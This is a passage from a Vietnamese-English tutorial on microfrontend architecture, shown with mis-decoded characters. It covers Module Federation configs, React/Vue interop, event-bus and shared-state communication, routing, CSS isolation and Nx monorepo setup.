â”‚  â”‚                                              â”‚        â”‚
â”‚  â”‚  - 3 teams Ä‘á»™c láº­p                          â”‚        â”‚
â”‚  â”‚  - Deploy riÃªng biá»‡t                        â”‚        â”‚
â”‚  â”‚  - Tech stack khÃ¡c nhau                     â”‚        â”‚
â”‚  â”‚  - Module Federation ghÃ©p ná»‘i runtime       â”‚        â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### **ğŸ’¡ Monorepo LÃ  GÃ¬? (What is Monorepo?)**

**Monorepo** lÃ  cÃ¡ch quáº£n lÃ½ code: **nhiá»u projects/packages** trong **1 repository duy nháº¥t**.

```
ğŸ“¦ monorepo-root/
â”œâ”€â”€ ğŸ“ apps/                    â† CÃ¡c á»©ng dá»¥ng (applications)
â”‚   â”œâ”€â”€ ğŸ“ shell/               â† Shell/Host app (React)
â”‚   â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â”œâ”€â”€ package.json
â”‚   â”‚   â””â”€â”€ webpack.config.js
â”‚   â”‚
â”‚   â”œâ”€â”€ ğŸ“ dashboard/           â† Dashboard app (React)
â”‚   â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â””â”€â”€ package.json
â”‚   â”‚
â”‚   â””â”€â”€ ğŸ“ profile/             â† Profile app (Vue)
â”‚       â”œâ”€â”€ src/
â”‚       â””â”€â”€ package.json
â”‚
â”œâ”€â”€ ğŸ“ libs/                    â† Shared libraries (thÆ° viá»‡n dÃ¹ng chung)
â”‚   â”œâ”€â”€ ğŸ“ shared-ui/           â† UI components (Button, Input, etc.)
â”‚   â”œâ”€â”€ ğŸ“ shared-auth/         â† Auth logic (login, logout, etc.)
â”‚   â””â”€â”€ ğŸ“ shared-utils/        â† Utils (date, string, etc.)
â”‚
â”œâ”€â”€ package.json                â† Root package.json
â”œâ”€â”€ nx.json                     â† Nx workspace config
â””â”€â”€ tsconfig.base.json          â† Shared TypeScript config
```

**ğŸ”¥ Æ¯u Äiá»ƒm Monorepo:**
- âœ… **Code sharing dá»… dÃ ng**: Import libs giá»¯a cÃ¡c apps
- âœ… **Atomic commits**: 1 commit thay Ä‘á»•i nhiá»u apps
- âœ… **Consistent tooling**: CÃ¹ng ESLint, Prettier, TypeScript config
- âœ… **Dependency management**: 1 `package.json` root cho táº¥t cáº£

---

**ğŸ“š Pháº§n 2: Module Federation - Runtime Code Sharing**

#### **ğŸ’¡ Module Federation LÃ  GÃ¬?**

**Module Federation** (Webpack 5 / Vite Federation) lÃ  ká»¹ thuáº­t cho phÃ©p **chia sáº» code giá»¯a cÃ¡c apps á»Ÿ runtime** (khÃ´ng pháº£i build time).

**ğŸ”¥ CÆ¡ Cháº¿ Hoáº¡t Äá»™ng:**

```typescript
// ===================================================
// ğŸ  SHELL APP (Host - React) - webpack.config.js
// ===================================================
// ÄÃ¢y lÃ  app chÃ­nh, load cÃ¡c remote apps vÃ o

const ModuleFederationPlugin = require('webpack/lib/container/ModuleFederationPlugin');

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'shell', // âš ï¸ TÃªn app nÃ y
      
      // ğŸ“¥ REMOTES: CÃ¡c app remote mÃ  shell sáº½ load
      remotes: {
        // Key: tÃªn import, Value: URL + scope name
        dashboard: 'dashboard@http://localhost:3001/remoteEntry.js', // Dashboard app (React)
        profile: 'profile@http://localhost:3002/remoteEntry.js',     // Profile app (Vue)
      },
      
      // ğŸ“¤ EXPOSES: Nhá»¯ng gÃ¬ shell chia sáº» cho remote apps
      exposes: {
        './Header': './src/components/Header',     // Share Header component
        './AuthService': './src/services/AuthService', // Share Auth service
      },
      
      // ğŸ”„ SHARED: Dependencies dÃ¹ng chung (trÃ¡nh duplicate)
      shared: {
        react: { 
          singleton: true,        // âš ï¸ Chá»‰ cÃ³ 1 instance React trong toÃ n bá»™ app
          requiredVersion: '^18.0.0', // Version yÃªu cáº§u
          eager: true             // Load ngay láº­p tá»©c (khÃ´ng lazy)
        },
        'react-dom': { singleton: true, eager: true },
      },
    }),
  ],
};

// ===================================================
// ğŸ“Š DASHBOARD APP (Remote - React) - webpack.config.js
// ===================================================
// App Ä‘á»™c láº­p, expose components cho shell

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'dashboard', // âš ï¸ TÃªn app nÃ y (pháº£i trÃ¹ng vá»›i remotes á»Ÿ shell)
      filename: 'remoteEntry.js', // âš ï¸ File entry point
      
      // ğŸ“¤ EXPOSES: Components/modules mÃ  dashboard chia sáº»
      exposes: {
        './DashboardPage': './src/pages/DashboardPage',     // Main page
        './StatsWidget': './src/components/StatsWidget',    // Widget component
      },
      
      // ğŸ”„ SHARED: Dependencies dÃ¹ng chung vá»›i shell
      shared: {
        react: { singleton: true, requiredVersion: '^18.0.0' },
        'react-dom': { singleton: true },
      },
    }),
  ],
};

// ===================================================
// ğŸ‘¤ PROFILE APP (Remote - Vue 3) - vite.config.ts
// ===================================================
// App Vue, expose components cho shell (Multi-framework!)

import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';
import federation from '@originjs/vite-plugin-federation';

export default defineConfig({
  plugins: [
    vue(),
    federation({
      name: 'profile', // âš ï¸ TÃªn app
      filename: 'remoteEntry.js',
      
      // ğŸ“¤ EXPOSES: Vue components
      exposes: {
        './ProfilePage': './src/pages/ProfilePage.vue',    // Vue component
        './UserAvatar': './src/components/UserAvatar.vue', // Vue component
      },
      
      // ğŸ”„ SHARED: Vue dependencies
      shared: {
        vue: { singleton: true },
      },
    }),
  ],
});
```

#### **ğŸ¯ Sá»­ Dá»¥ng Remote Components trong Shell**

```typescript
// ===================================================
// ğŸ  SHELL APP - src/App.tsx (React)
// ===================================================

import React, { Suspense, lazy } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// ğŸ“¥ LAZY LOAD remote components tá»« dashboard (React)
const DashboardPage = lazy(() => import('dashboard/DashboardPage'));
//                                       â†‘         â†‘
//                              remote name    exposed module

// ğŸ“¥ LAZY LOAD remote components tá»« profile (Vue)
const ProfilePage = lazy(() => import('profile/ProfilePage'));

function App() {
  return (
    <BrowserRouter>
      <div className="app">
        <Header /> {/* Shell's own component */}
        
        <Suspense fallback={<div>Loading...</div>}>
          <Routes>
            {/* Dashboard app (React) - Team A */}
            <Route path="/dashboard" element={<DashboardPage />} />
            
            {/* Profile app (Vue) - Team B */}
            <Route path="/profile" element={<ProfilePage />} />
          </Routes>
        </Suspense>
      </div>
    </BrowserRouter>
  );
}

export default App;

// âš ï¸ TypeScript types cho remote modules
// src/types/remotes.d.ts
declare module 'dashboard/DashboardPage' {
  const DashboardPage: React.ComponentType;
  export default DashboardPage;
}

declare module 'profile/ProfilePage' {
  const ProfilePage: React.ComponentType;
  export default ProfilePage;
}
```

**ğŸ”¥ Timeline Hoáº¡t Äá»™ng:**

```
User truy cáº­p http://localhost:3000/dashboard

1ï¸âƒ£ Shell app load (React)
   â””â”€ Load shell bundle (~500KB)
   â””â”€ Render Header, Sidebar

2ï¸âƒ£ User click "Dashboard" â†’ Route change
   â””â”€ React Router match /dashboard
   â””â”€ Trigger lazy(() => import('dashboard/DashboardPage'))

3ï¸âƒ£ Module Federation fetch remote
   â””â”€ Fetch http://localhost:3001/remoteEntry.js
   â””â”€ Parse manifest (biáº¿t dashboard expose gÃ¬)
   â””â”€ Fetch dashboard chunk (~300KB)

4ï¸âƒ£ Dashboard component render
   â””â”€ DÃ¹ng shared React instance tá»« shell (khÃ´ng duplicate)
   â””â”€ Render DashboardPage component

Total: Shell (500KB) + Dashboard (300KB) = 800KB
âœ… Náº¿u KHÃ”NG dÃ¹ng Module Federation: 500KB + 500KB = 1MB (duplicate React)
```

---

**ğŸ“š Pháº§n 3: Multi-Framework Development (PhÃ¡t Triá»ƒn Äa Framework)**

#### **ğŸ’¡ Táº¡i Sao Cáº§n Multi-Framework?**

- âœ… **Legacy migration**: Migrate tá»« Angular â†’ React tá»«ng pháº§n
- âœ… **Team autonomy**: Team A dÃ¹ng React, Team B dÃ¹ng Vue
- âœ… **Best tool for the job**: Dashboard dÃ¹ng React, Charts dÃ¹ng Svelte

#### **ğŸ”¥ CÃ¡ch Hoáº¡t Äá»™ng:**

```typescript
// ===================================================
// ğŸ  SHELL (React) load PROFILE (Vue)
// ===================================================

// Shell App (React) - src/App.tsx
import React, { Suspense, lazy, useEffect, useRef } from 'react';

// âŒ KHÃ”NG THá»‚: Import Vue component trá»±c tiáº¿p vÃ o React
// import ProfilePage from './ProfilePage.vue'; // âŒ Lá»—i!

// âœ… GIáº¢I PHÃP 1: Module Federation + Wrapper
const ProfilePage = lazy(() => import('profile/ProfilePage'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <ProfilePage /> {/* Vue component trong React! */}
    </Suspense>
  );
}

// ===================================================
// ğŸ‘¤ PROFILE APP (Vue) - src/pages/ProfilePage.vue
// ===================================================

<template>
  <div class="profile-page">
    <h1>{{ user.name }}</h1>
    <p>{{ user.email }}</p>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue';

const user = ref({ name: '', email: '' });

onMounted(async () => {
  // Fetch user data
  const response = await fetch('/api/user');
  user.value = await response.json();
});
</script>

// ===================================================
// ğŸ”§ PROFILE APP - Wrapper Ä‘á»ƒ React hiá»ƒu Vue component
// ===================================================

// profile/src/bootstrap.tsx
import { createApp } from 'vue';
import ProfilePage from './pages/ProfilePage.vue';

// Export function Ä‘á»ƒ mount Vue app vÃ o DOM element
export function mountProfilePage(el: HTMLElement) {
  const app = createApp(ProfilePage);
  app.mount(el);
  
  // Return cleanup function
  return () => app.unmount();
}

// profile/src/VueWrapper.tsx (React wrapper for Vue)
import React, { useEffect, useRef } from 'react';
import { mountProfilePage } from './bootstrap';

export default function VueWrapper() {
  const ref = useRef<HTMLDivElement>(null);
  
  useEffect(() => {
    if (ref.current) {
      const cleanup = mountProfilePage(ref.current); // Mount Vue app
      
      return () => cleanup(); // Unmount khi component unmount
    }
  }, []);
  
  return <div ref={ref}></div>; // Vue app sáº½ render vÃ o div nÃ y
}
```

**ğŸ¯ Framework Compatibility Matrix:**

| Shell â†“ / Remote â†’ | React         | Vue          | Angular      | Svelte       |
| ------------------ | ------------- | ------------ | ------------ | ------------ |
| **React**          | âœ… Native     | âœ… Wrapper   | âœ… Wrapper   | âœ… Wrapper   |
| **Vue**            | âœ… Wrapper    | âœ… Native    | âœ… Wrapper   | âœ… Wrapper   |
| **Angular**        | âœ… Wrapper    | âœ… Wrapper   | âœ… Native    | âœ… Wrapper   |
| **Svelte**         | âœ… Wrapper    | âœ… Wrapper   | âœ… Wrapper   | âœ… Native    |

---

**ğŸ“š Pháº§n 4: Communication Patterns (Máº«u Giao Tiáº¿p)**

CÃ¡c Micro apps cáº§n giao tiáº¿p vá»›i nhau (share data, trigger actions). CÃ³ 3 patterns chÃ­nh:

#### **ğŸ”¥ Pattern 1: Event Bus (Custom Events)**

```typescript
// ===================================================
// ğŸ“¡ EVENT BUS - libs/shared-communication/EventBus.ts
// ===================================================

// Simple EventEmitter pattern
class EventBus {
  private events: Map<string, Array<(...args: any[]) => void>> = new Map();
  
  // ÄÄƒng kÃ½ láº¯ng nghe event
  on(event: string, callback: (...args: any[]) => void): void {
    if (!this.events.has(event)) {
      this.events.set(event, []);
    }
    this.events.get(event)!.push(callback);
  }
  
  // Há»§y láº¯ng nghe event
  off(event: string, callback: (...args: any[]) => void): void {
    const callbacks = this.events.get(event);
    if (callbacks) {
      const index = callbacks.indexOf(callback);
      if (index > -1) callbacks.splice(index, 1);
    }
  }
  
  // PhÃ¡t event
  emit(event: string, ...args: any[]): void {
    const callbacks = this.events.get(event);
    if (callbacks) {
      callbacks.forEach(callback => callback(...args));
    }
  }
}

// Singleton instance - dÃ¹ng chung toÃ n bá»™ apps
export const eventBus = new EventBus();

// ===================================================
// ğŸ  SHELL APP - Listen to events
// ===================================================

import { eventBus } from '@myorg/shared-communication';
import { useEffect } from 'react';

function Shell() {
  useEffect(() => {
    // Láº¯ng nghe event "user-login" tá»« báº¥t ká»³ app nÃ o
    const handleLogin = (user: { name: string; email: string }) => {
      console.log('User logged in:', user);
      // Update shell state, show notification, etc.
    };
    
    eventBus.on('user-login', handleLogin);
    
    // Cleanup khi unmount
    return () => eventBus.off('user-login', handleLogin);
  }, []);
  
  return <div>Shell App</div>;
}

// ===================================================
// ğŸ“Š DASHBOARD APP - Emit events
// ===================================================

import { eventBus } from '@myorg/shared-communication';

function LoginButton() {
  const handleLogin = async () => {
    const user = await loginAPI();
    
    // PhÃ¡t event "user-login" cho táº¥t cáº£ apps láº¯ng nghe
    eventBus.emit('user-login', user);
  };
  
  return <button onClick={handleLogin}>Login</button>;
}
```

**âœ… Æ¯u Ä‘iá»ƒm Event Bus:**
- âœ… Decoupled (apps khÃ´ng cáº§n biáº¿t nhau)
- âœ… Dá»… implement
- âœ… Multi-framework compatible

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ KhÃ³ debug (khÃ´ng biáº¿t ai emit, ai listen)
- âŒ No type safety (TypeScript khÃ´ng check Ä‘Æ°á»£c)
- âŒ Memory leaks náº¿u quÃªn `off()`

#### **ğŸ”¥ Pattern 2: Shared State (Redux/Zustand)**

```typescript
// ===================================================
// ğŸ—ƒï¸ SHARED STATE - libs/shared-state/store.ts
// ===================================================

import { create } from 'zustand';

// Zustand store - Ä‘Æ¡n giáº£n hÆ¡n Redux
interface AppState {
  user: { name: string; email: string } | null;
  theme: 'light' | 'dark';
  
  // Actions
  setUser: (user: AppState['user']) => void;
  setTheme: (theme: AppState['theme']) => void;
}

export const useAppStore = create<AppState>((set) => ({
  user: null,
  theme: 'light',
  
  setUser: (user) => set({ user }),
  setTheme: (theme) => set({ theme }),
}));

// ===================================================
// ğŸ  SHELL APP - Read/Write shared state
// ===================================================

import { useAppStore } from '@myorg/shared-state';

function Header() {
  const user = useAppStore((state) => state.user);    // Subscribe to user
  const setUser = useAppStore((state) => state.setUser);
  
  const handleLogin = async () => {
    const user = await loginAPI();
    setUser(user); // âš ï¸ Táº¥t cáº£ apps subscribe sáº½ update!
  };
  
  return (
    <header>
      {user ? `Hello ${user.name}` : 'Not logged in'}
      <button onClick={handleLogin}>Login</button>
    </header>
  );
}

// ===================================================
// ğŸ“Š DASHBOARD APP - Read shared state
// ===================================================

import { useAppStore } from '@myorg/shared-state';

function DashboardPage() {
  const user = useAppStore((state) => state.user); // Auto update khi user thay Ä‘á»•i
  
  if (!user) return <div>Please login</div>;
  
  return <div>Welcome {user.name}!</div>;
}
```

**âœ… Æ¯u Ä‘iá»ƒm Shared State:**
- âœ… Type safe (TypeScript)
- âœ… Predictable (1 source of truth)
- âœ… Dá»… debug (DevTools)

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Tightly coupled (apps phá»¥ thuá»™c vÃ o shared state)
- âŒ Phá»©c táº¡p hÆ¡n Event Bus

#### **ğŸ”¥ Pattern 3: Props/Callbacks (Parent â†’ Child)**

```typescript
// ===================================================
// ğŸ  SHELL APP - Pass props to remote apps
// ===================================================

function App() {
  const [user, setUser] = useState(null);
  
  return (
    <div>
      {/* Pass props xuá»‘ng Dashboard remote */}
      <DashboardPage 
        user={user}                    // âš ï¸ Data flow: Shell â†’ Dashboard
        onLogout={() => setUser(null)} // âš ï¸ Callback: Dashboard â†’ Shell
      />
    </div>
  );
}
```

**ğŸ¯ Khi NÃ o DÃ¹ng Pattern NÃ o?**

| Pattern             | Use Case                                       | Coupling   |
| ------------------- | ---------------------------------------------- | ---------- |
| **Event Bus**       | Loosely coupled events (login, logout, notify) | Loose âœ…   |
| **Shared State**    | Global state (user, theme, cart)               | Medium âš ï¸  |
| **Props/Callbacks** | Parent-child communication                     | Tight âŒ   |

---

**ğŸ“š Pháº§n 5: Routing Strategies (Chiáº¿n LÆ°á»£c Äá»‹nh Tuyáº¿n)**

#### **ğŸ’¡ Problem: Ai Quáº£n LÃ½ Routes?**

Vá»›i Microfrontend, routing cÃ³ 2 chiáº¿n lÆ°á»£c:

#### **ğŸ”¥ Strategy 1: Shell-based Routing (Shell quáº£n lÃ½ táº¥t cáº£ routes)**

```typescript
// ===================================================
// ğŸ  SHELL APP - Quáº£n lÃ½ táº¥t cáº£ routes
// ===================================================

import { BrowserRouter, Routes, Route } from 'react-router-dom';
import { lazy, Suspense } from 'react';

// Lazy load remote apps
const DashboardPage = lazy(() => import('dashboard/DashboardPage'));
const ProfilePage = lazy(() => import('profile/ProfilePage'));
const OrdersPage = lazy(() => import('orders/OrdersPage'));

function App() {
  return (
    <BrowserRouter>
      <Header />
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          {/* Shell routes */}
          <Route path="/" element={<HomePage />} />
          
          {/* Dashboard routes - SHELL quyáº¿t Ä‘á»‹nh */}
          <Route path="/dashboard" element={<DashboardPage />} />
          <Route path="/dashboard/stats" element={<DashboardPage />} />
          
          {/* Profile routes - SHELL quyáº¿t Ä‘á»‹nh */}
          <Route path="/profile" element={<ProfilePage />} />
          <Route path="/profile/settings" element={<ProfilePage />} />
          
          {/* Orders routes - SHELL quyáº¿t Ä‘á»‹nh */}
          <Route path="/orders" element={<OrdersPage />} />
          <Route path="/orders/:id" element={<OrdersPage />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}
```

**âœ… Æ¯u Ä‘iá»ƒm:**
- âœ… Centralized routing (1 nÆ¡i quáº£n lÃ½ táº¥t cáº£)
- âœ… Dá»… setup, dá»… hiá»ƒu
- âœ… Shell control navigation flow

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Remote apps khÃ´ng autonomous (phá»¥ thuá»™c shell)
- âŒ Shell pháº£i biáº¿t táº¥t cáº£ routes cá»§a remotes

#### **ğŸ”¥ Strategy 2: Distributed Routing (Má»—i app tá»± quáº£n lÃ½ routes)**

```typescript
// ===================================================
// ğŸ  SHELL APP - Chá»‰ route top-level
// ===================================================

import { BrowserRouter, Routes, Route } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <Routes>
        {/* Shell chá»‰ route /dashboard/*, cÃ²n láº¡i Ä‘á»ƒ Dashboard tá»± handle */}
        <Route path="/dashboard/*" element={<DashboardApp />} />
        
        {/* Profile tá»± handle /profile/* */}
        <Route path="/profile/*" element={<ProfileApp />} />
      </Routes>
    </BrowserRouter>
  );
}

// ===================================================
// ğŸ“Š DASHBOARD APP - Tá»± quáº£n lÃ½ routes con
// ===================================================

import { Routes, Route } from 'react-router-dom';

function DashboardApp() {
  return (
    <Routes>
      {/* /dashboard â†’ /dashboard (trang chÃ­nh) */}
      <Route path="/" element={<DashboardHome />} />
      
      {/* /dashboard/stats */}
      <Route path="/stats" element={<StatsPage />} />
      
      {/* /dashboard/reports */}
      <Route path="/reports" element={<ReportsPage />} />
    </Routes>
  );
}
```

**âœ… Æ¯u Ä‘iá»ƒm:**
- âœ… Autonomous apps (má»—i app tá»± quáº£n lÃ½ routes)
- âœ… Shell khÃ´ng cáº§n biáº¿t routes cá»§a remotes

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Phá»©c táº¡p hÆ¡n
- âŒ CÃ³ thá»ƒ conflict routes giá»¯a apps

---

**ğŸ“š Pháº§n 6: Styling Isolation (CÃ´ Láº­p CSS)**

#### **ğŸ’¡ Problem: CSS Conflicts Giá»¯a CÃ¡c Apps**

```css
/* Dashboard App - styles.css */
.header { background: red; }      /* âŒ Class name chung */

/* Profile App - styles.css */
.header { background: blue; }     /* âŒ Conflict! */

/* Káº¿t quáº£: Header mÃ u gÃ¬? TÃ¹y thuá»™c CSS nÃ o load sau! */
```

#### **ğŸ”¥ Solution 1: CSS Modules**

```typescript
// ===================================================
// ğŸ“Š DASHBOARD APP - DashboardHeader.module.css
// ===================================================

/* File: DashboardHeader.module.css */
.header {
  background: red;
  padding: 20px;
}

.title {
  font-size: 24px;
}

// ===================================================
// ğŸ“Š DASHBOARD APP - DashboardHeader.tsx
// ===================================================

import styles from './DashboardHeader.module.css';

function DashboardHeader() {
  return (
    <header className={styles.header}> {/* âœ… className = "DashboardHeader_header__abc123" */}
      <h1 className={styles.title}>Dashboard</h1>
    </header>
  );
}

// Output HTML:
// <header class="DashboardHeader_header__abc123">
//   <h1 class="DashboardHeader_title__def456">Dashboard</h1>
// </header>
```

**âœ… Æ¯u Ä‘iá»ƒm CSS Modules:**
- âœ… Scoped styles (khÃ´ng conflict)
- âœ… Build-time transformation

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ KhÃ´ng dÃ¹ng Ä‘Æ°á»£c global styles dá»… dÃ ng

#### **ğŸ”¥ Solution 2: CSS-in-JS (Styled Components, Emotion)**

```typescript
// ===================================================
// ğŸ“Š DASHBOARD APP - Styled Components
// ===================================================

import styled from 'styled-components';

// âœ… Styles scoped to component, auto-generate unique class names
const Header = styled.header`
  background: red;
  padding: 20px;
  
  h1 {
    font-size: 24px;
  }
`;

function DashboardHeader() {
  return (
    <Header>
      <h1>Dashboard</h1>
    </Header>
  );
}

// Output HTML:
// <header class="sc-bdnxRM jZQkXY">  â† Unique class name
//   <h1>Dashboard</h1>
// </header>
```

**âœ… Æ¯u Ä‘iá»ƒm CSS-in-JS:**
- âœ… Scoped styles
- âœ… Dynamic styles (props-based)
- âœ… No CSS files

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Runtime overhead
- âŒ Larger bundle size

#### **ğŸ”¥ Solution 3: Shadow DOM**

```typescript
// ===================================================
// ğŸ“Š DASHBOARD APP - Shadow DOM (Web Components)
// ===================================================

class DashboardHeader extends HTMLElement {
  connectedCallback() {
    // Táº¡o Shadow DOM - HOÃ€N TOÃ€N CÃ” Láº¬P!
    const shadow = this.attachShadow({ mode: 'open' });
    
    shadow.innerHTML = `
      <style>
        /* âœ… CSS nÃ y CHá»ˆ apply trong Shadow DOM, KHÃ”NG leak ra ngoÃ i */
        .header {
          background: red;
          padding: 20px;
        }
      </style>
      
      <header class="header">
        <h1>Dashboard</h1>
      </header>
    `;
  }
}

customElements.define('dashboard-header', DashboardHeader);

// Usage: <dashboard-header></dashboard-header>
```

**âœ… Æ¯u Ä‘iá»ƒm Shadow DOM:**
- âœ… TRUE isolation (100% khÃ´ng conflict)
- âœ… Native browser API

**âŒ NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ KhÃ³ style tá»« bÃªn ngoÃ i
- âŒ KhÃ´ng dÃ¹ng Ä‘Æ°á»£c vá»›i React/Vue components

#### **ğŸ”¥ Solution 4: Prefix/Namespace**

```css
/* ===================================================
   ğŸ“Š DASHBOARD APP - Prefix táº¥t cáº£ classes
   =================================================== */

/* dashboard-styles.css */
.dashboard-header { background: red; }      /* âœ… Prefix "dashboard-" */
.dashboard-title { font-size: 24px; }

/* ===================================================
   ğŸ‘¤ PROFILE APP - Prefix khÃ¡c
   =================================================== */

/* profile-styles.css */
.profile-header { background: blue; }       /* âœ… Prefix "profile-" */
.profile-title { font-size: 20px; }

/* âœ… KhÃ´ng conflict vÃ¬ tÃªn classes khÃ¡c nhau */
```

**ğŸ¯ Styling Strategy Comparison:**

| Strategy            | Isolation | Performance | DX (Developer Experience) | Use Case           |
| ------------------- | --------- | ----------- | ------------------------- | ------------------ |
| **CSS Modules**     | â­â­â­â­    | â­â­â­â­â­     | â­â­â­â­                      | Default choice     |
| **CSS-in-JS**       | â­â­â­â­â­   | â­â­â­        | â­â­â­â­â­                    | Dynamic styles     |
| **Shadow DOM**      | â­â­â­â­â­   | â­â­â­â­â­     | â­â­â­                       | Web Components     |
| **Prefix/Namespace**| â­â­â­      | â­â­â­â­â­     | â­â­                         | Simple projects    |

---

**ğŸ“š Pháº§n 7: Nx Monorepo Setup (Thá»±c HÃ nh)**

```bash
# ===================================================
# ğŸš€ Táº¡o Nx Monorepo vá»›i Microfrontend
# ===================================================

# 1ï¸âƒ£ Táº¡o workspace
npx create-nx-workspace@latest myorg --preset=react-monorepo

# 2ï¸âƒ£ Táº¡o Shell app (Host)
nx g @nx/react:app shell

# 3ï¸âƒ£ Táº¡o Remote apps
nx g @nx/react:app dashboard
nx g @nx/react:app profile

# 4ï¸âƒ£ Táº¡o Shared library
nx g @nx/react:lib shared-ui
nx g @nx/js:lib shared-communication

# 5ï¸âƒ£ Configure Module Federation
nx g @nx/react:setup-mf shell --mfType=host
nx g @nx/react:setup-mf dashboard --mfType=remote --host=shell
nx g @nx/react:setup-mf profile --mfType=remote --host=shell

# 6ï¸âƒ£ Serve táº¥t cáº£ apps
nx serve shell  # http://localhost:4200 (auto serve remotes)

# ğŸ“Š Káº¿t quáº£ cáº¥u trÃºc:
# myorg/
# â”œâ”€â”€ apps/
# â”‚   â”œâ”€â”€ shell/              â† Host app (React)
# â”‚   â”œâ”€â”€ dashboard/          â† Remote app (React)
# â”‚   â””â”€â”€ profile/            â† Remote app (React)
# â”œâ”€â”€ libs/
# â”‚   â”œâ”€â”€ shared-ui/          â† Shared components
# â”‚   â””â”€â”€ shared-communication/ â† Event Bus, Shared State
# â””â”€â”€ nx.json
```

---

**âœ… Best Practices (Thá»±c HÃ nh Tá»‘t Nháº¥t)**

#### **ğŸ”¥ 1. Dependency Management**

```json
// âŒ SAI: Má»—i app cÃ³ version React khÃ¡c nhau
{
  "shell": { "react": "18.0.0" },
  "dashboard": { "react": "17.0.0" },  // âŒ Conflict!
  "profile": { "react": "18.2.0" }      // âŒ Duplicate bundles!
}

// âœ… ÄÃšNG: Shared dependencies á»Ÿ root
// package.json (root)
{
  "dependencies": {
    "react": "18.2.0",        // âœ… Táº¥t cáº£ apps dÃ¹ng chung version
    "react-dom": "18.2.0"
  }
}
```

#### **ğŸ”¥ 2. Versioning Strategy**

```bash
# Semantic Versioning cho remote apps
dashboard@1.2.3
          â”‚ â”‚ â””â”€ PATCH: Bug fixes (backward compatible)
          â”‚ â””â”€â”€â”€ MINOR: New features (backward compatible)
          â””â”€â”€â”€â”€â”€ MAJOR: Breaking changes (NOT backward compatible)

# Shell compatibility matrix
shell@2.0.0 â†’ dashboard@^1.0.0 (âœ… Compatible vá»›i 1.x.x)
            â†’ profile@^2.0.0
```

#### **ğŸ”¥ 3. Error Boundaries**

```typescript
// ===================================================
// ğŸ  SHELL APP - Error Boundary cho remote apps
// ===================================================

import { Component, ErrorInfo, ReactNode } from 'react';

class RemoteErrorBoundary extends Component<
  { children: ReactNode },
  { hasError: boolean }
> {
  state = { hasError: false };
  
  static getDerivedStateFromError() {
    return { hasError: true };
  }
  
  componentDidCatch(error: Error, errorInfo: ErrorInfo) {
    console.error('Remote app crashed:', error, errorInfo);
    // Log to Sentry, Datadog, etc.
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div>
          <h2>Oops! Dashboard app crashed ğŸ˜¢</h2>
          <button onClick={() => this.setState({ hasError: false })}>
            Retry
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

// Usage
function App() {
  return (
    <RemoteErrorBoundary>
      <DashboardPage /> {/* Náº¿u crash, khÃ´ng áº£nh hÆ°á»Ÿng Shell */}
    </RemoteErrorBoundary>
  );
}
```

#### **ğŸ”¥ 4. Performance Optimization**

```typescript
// ===================================================
// ğŸš€ Preload remote apps khi user hover
// ===================================================

import { useState } from 'react';

function Navigation() {
  const [prefetched, setPrefetched] = useState<Set<string>>(new Set());
  
  const prefetchRemote = (remoteName: string) => {
    if (prefetched.has(remoteName)) return;
    
    // Preload remote module
    import(`${remoteName}/App`).then(() => {
      setPrefetched(prev => new Set(prev).add(remoteName));
      console.log(`âœ… Prefetched ${remoteName}`);
    });
  };
  
  return (
    <nav>
      <a 
        href="/dashboard"
        onMouseEnter={() => prefetchRemote('dashboard')} // âš¡ Hover = preload
      >
        Dashboard
      </a>
      <a 
        href="/profile"
        onMouseEnter={() => prefetchRemote('profile')}
      >
        Profile
      </a>
    </nav>
  );
}
```

---

**âŒ Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p)**

```typescript
// âŒ 1. Duplicate dependencies (React loaded 2 láº§n)
// Shell: 500KB React + Dashboard: 500KB React = 1MB! âŒ
// âœ… Fix: DÃ¹ng Module Federation shared config

// âŒ 2. Tight coupling via shared state
const user = useGlobalState('user'); // âŒ Dashboard phá»¥ thuá»™c shell
// âœ… Fix: DÃ¹ng Event Bus cho loose coupling

// âŒ 3. No error boundaries
<DashboardPage /> // âŒ Náº¿u crash â†’ toÃ n bá»™ app crash
// âœ… Fix: Wrap trong ErrorBoundary

// âŒ 4. CSS conflicts
.header { ... } // âŒ Dashboard vÃ  Profile cÃ¹ng class name
// âœ… Fix: CSS Modules, CSS-in-JS, hoáº·c prefix

// âŒ 5. Version mismatch
shell: react@18 â†” dashboard: react@17 // âŒ Conflict!
// âœ… Fix: Enforce singleton trong Module Federation
```

---

**ğŸ“ Summary (TÃ³m Táº¯t)**

| Concept                | Giáº£i ThÃ­ch                                             | Use Case                   |
| ---------------------- | ------------------------------------------------------ | -------------------------- |
| **Microfrontend**      | Chia app lá»›n thÃ nh nhiá»u apps nhá» Ä‘á»™c láº­p              | Large teams, multi-product |
| **Monorepo**           | Nhiá»u projects trong 1 repo                            | Code sharing, consistency  |
